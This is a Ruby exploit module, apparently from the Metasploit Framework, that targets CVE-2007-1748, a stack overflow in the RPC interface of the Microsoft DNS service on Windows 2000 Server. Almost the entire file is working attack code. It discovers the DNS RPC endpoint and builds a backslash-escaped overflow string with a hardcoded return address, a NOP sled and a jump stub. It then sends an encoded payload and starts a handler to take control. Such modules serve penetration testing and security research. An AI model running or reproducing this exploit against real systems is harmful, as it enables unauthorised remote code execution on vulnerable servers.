##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Exploits::Windows::Dcerpc::Microsoft_DNS_RPC_ZoneName < Msf::Exploit::Remote

	include Exploit::Remote::DCERPC
	include Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Microsoft DNS RPC extractQuotedChar() Overflow',
			'Description'    => %q{
				This module exploits a stack overflow in the RPC interface
				of the Microsoft DNS service. The vulnerability is triggered
				when a long zone name parameter is supplied that contains 
				backslash characters. 
			},
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					['CVE', '2007-1748'],
					['URL', 'http://www.microsoft.com/technet/security/advisory/935964.mspx']
				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 1024,
					
					# The payload doesn't matter, but make_nops() uses these too
					'BadChars' => "\x00\x5c\x5f\x31\x32\x33\x34\x35\x36\x37",
					
					'StackAdjustment' => -3500,

				},
			'SaveRegisters'  => [ 'esp', 'edi' ],
			'Targets'        => 
				[
					# 0x31 - 0x37 are converted to 0x01 - 0x07 
					[
						'Windows 2000 Server SP0-SP4+ English',
						{
							'Platform' => 'win',
							'Ret'      => 0x750219d6 # jmp ebx in ws2help.dll,
						},
					],
				],
			'DisclosureDate' => 'Apr 13 2007',
			'DefaultTarget' => 0))
		
		register_options(
			[
				Opt::RPORT(0)
			], self.class)
	end
	
	def exploit

		dport = datastore['RPORT'].to_i
		if (dport == 0)
			
			dport = dcerpc_endpoint_find_tcp(datastore['RHOST'], '50abc2a4-574d-40b3-9d66-ee4fd5fba076', '5.0', 'ncacn_ip_tcp')
			
			if (not dport)
				print_status("Could not determine the RPC port used by the Microsoft DNS Server")
				return
			end
			
			print_status("Discovered Microsoft DNS Server RPC service on port #{dport}")
		end

		connect(true, { 'RPORT' => dport })
		print_status("Trying target #{target.name}...")
		
		handle = dcerpc_handle('50abc2a4-574d-40b3-9d66-ee4fd5fba076', '5.0', 'ncacn_ip_tcp', [datastore['RPORT']])
		print_status("Binding to #{handle} ...")
		dcerpc_bind(handle)
		print_status("Bound to #{handle} ...")

		jumper =
			"\x81\xef" + [-0x0604].pack("V") +
			"\xff\xd7"

		txt = Rex::Text.rand_text_alpha(480)
		txt << make_nops(160)
		txt << jumper
		
		txt[465, 4] = [target.ret].pack("V")
		
		req = ''
		txt.each_byte do |c|
			req << "\\"
			req << c
		end
		
		stubdata =
			NDR.long(rand(0xffffffff)) +
			NDR.wstring(Rex::Text.rand_text_alpha(1) + "\x00\x00") +
			
			NDR.long(rand(0xffffffff)) +
			NDR.string(req + "\x00") +
			
			NDR.long(rand(0xffffffff)) +
			NDR.string(Rex::Text.rand_text_alpha(1) + "\x00")
		
		stubdata << make_nops(512) + payload.encoded
		
		print_status('Sending exploit ...')
	
		begin
			response = dcerpc.call(1, stubdata)

			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
				print_status(">> " + dcerpc.last_response.stub_data.unpack("H*")[0])
			end
		rescue ::Exception => e
			print_status("Error: #{e}")
		end
		
		handler
		disconnect
	end

end
end	
